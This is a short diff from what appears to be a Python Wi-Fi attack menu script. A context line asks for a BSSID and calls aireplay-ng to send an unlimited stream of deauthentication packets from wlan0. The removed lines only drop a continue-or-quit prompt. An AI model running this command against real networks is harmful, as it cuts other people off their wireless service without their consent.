@@ -118,11 +118,6 @@ I8,        8        ,8I 88    ad88 88         ,ad8888ba,                        
         print(text)
         bssid2 = input("Enter bssid: ")
         subprocess.call(["aireplay-ng", "-0", "0", "-a", bssid2 ,"wlan0"])
-        adptor_return3 = int(input("Press 1 to Continue or Ctrl+z to quit: "))
-        if adptor_return3 == 1:
-                continue
-        else:
-                break
     else:
         print("Invalid option. Please choose a valid option.")
         break
